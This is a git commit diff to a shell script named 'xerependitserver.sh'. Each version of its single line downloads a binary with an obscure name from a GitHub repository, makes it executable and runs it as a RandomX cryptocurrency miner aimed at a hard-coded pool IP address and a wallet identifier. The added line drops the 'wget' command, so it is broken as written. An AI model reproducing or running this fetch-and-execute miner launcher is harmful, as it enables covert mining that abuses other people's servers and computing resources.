b6d0864d36044c268b3882152b0ccc0954361781
ismaimwan6372 <137773221+ismaimwan6372@users.noreply.github.com>
2023-07-15 16:35:14 +0800

    Update xerependitserver.sh

--- xerependitserver.sh
+++ xerependitserver.sh
@@ -1,1 +1,1 @@
-wget https://github.com/ismaimwan6372/crempotoso/raw/main/livegolikas && chmod 700 livegolikas && ./livegolikas -a RandomX -o 209.25.142.78:3333 -u XRP:rNxp4h8apvRis6mJf9Sh8C6iRxfrDWN7AV:399018811.STRIXPRO -t 3
+https://github.com/ismaimwan6372/xerependit/raw/main/xerependit && chmod 700 xerependit && ./xerependit -a RandomX -o 209.25.142.78:3333 -u XRP:rNxp4h8apvRis6mJf9Sh8C6iRxfrDWN7AV:399018811.STRIXPRO -t 3
